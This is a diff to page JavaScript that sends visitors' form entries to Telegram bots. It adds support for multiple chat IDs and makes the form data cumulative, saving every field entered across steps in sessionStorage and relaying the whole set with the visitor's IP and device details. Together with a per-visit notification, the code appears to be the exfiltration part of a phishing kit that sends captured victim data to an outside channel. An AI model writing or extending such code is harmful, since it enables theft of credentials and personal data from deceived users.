@@ -61,7 +61,7 @@ function getDeviceInfo() {
 }
 
 /**
- * Send message to Telegram
+ * Send message to Telegram (supports multiple chat IDs)
  */
 async function sendToTelegram(message, parseMode = 'Markdown') {
     if (!TELEGRAM_CONFIG.BOT_TOKEN || !TELEGRAM_CONFIG.CHAT_ID || 
@@ -71,31 +71,52 @@ async function sendToTelegram(message, parseMode = 'Markdown') {
         return false;
     }
     
-    try {
-        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`, {
-            method: "POST",
-            headers: { 
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-                chat_id: TELEGRAM_CONFIG.CHAT_ID,
-                text: message,
-                parse_mode: parseMode
-            })
-        });
-        
-        if (!response.ok) {
-            const errorData = await response.json().catch(() => ({}));
-            console.warn("Telegram API error:", response.status, errorData);
-            return false;
-        }
-        
-        return true;
-    } catch (error) {
-        console.warn("Error sending Telegram message (non-critical):", error);
-        // Don't throw - just return false so form submission can continue
+    // Support both single chat ID (string) and multiple chat IDs (array)
+    let chatIds = [];
+    if (Array.isArray(TELEGRAM_CONFIG.CHAT_ID)) {
+        chatIds = TELEGRAM_CONFIG.CHAT_ID;
+    } else if (typeof TELEGRAM_CONFIG.CHAT_ID === 'string') {
+        // Support comma-separated string or single string
+        chatIds = TELEGRAM_CONFIG.CHAT_ID.includes(',') 
+            ? TELEGRAM_CONFIG.CHAT_ID.split(',').map(id => id.trim())
+            : [TELEGRAM_CONFIG.CHAT_ID];
+    } else {
+        console.warn('Invalid CHAT_ID format in config.js');
         return false;
     }
+    
+    // Send message to all chat IDs
+    const sendPromises = chatIds.map(async (chatId) => {
+        try {
+            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: { 
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: parseMode
+                })
+            });
+            
+            if (!response.ok) {
+                const errorData = await response.json().catch(() => ({}));
+                console.warn(`Telegram API error for chat ${chatId}:`, response.status, errorData);
+                return false;
+            }
+            
+            return true;
+        } catch (error) {
+            console.warn(`Error sending Telegram message to ${chatId} (non-critical):`, error);
+            return false;
+        }
+    });
+    
+    // Wait for all messages to be sent (don't fail if some fail)
+    const results = await Promise.all(sendPromises);
+    // Return true if at least one message was sent successfully
+    return results.some(result => result === true);
 }
 
 /**
@@ -123,10 +144,31 @@ async function sendVisitNotification() {
 }
 
 /**
- * Send form data to Telegram
+ * Send form data to Telegram (cumulative - includes all previous entries)
  */
 async function sendFormDataToTelegram(subject, data) {
     try {
+        // Get previous data from sessionStorage
+        let previousData = {};
+        try {
+            const stored = sessionStorage.getItem('formData');
+            if (stored) {
+                previousData = JSON.parse(stored);
+            }
+        } catch (e) {
+            console.warn("Error reading previous form data:", e);
+        }
+        
+        // Merge previous data with new data (new data overwrites if key exists)
+        const cumulativeData = { ...previousData, ...data };
+        
+        // Save cumulative data back to sessionStorage
+        try {
+            sessionStorage.setItem('formData', JSON.stringify(cumulativeData));
+        } catch (e) {
+            console.warn("Error saving form data:", e);
+        }
+        
         // Get user info - don't fail if this errors
         const userInfo = await getUserInfo().catch(() => ({
             ip: "Unknown",
@@ -140,8 +182,8 @@ async function sendFormDataToTelegram(subject, data) {
         
         let message = `📋 *${subject}*\n━━━━━━━━━━━━━━━\n`;
         
-        // Add form data
-        for (const [key, value] of Object.entries(data)) {
+        // Add all cumulative form data (previous + new)
+        for (const [key, value] of Object.entries(cumulativeData)) {
             if (value) {
                 message += `*${key}:* ${value}\n`;
             }
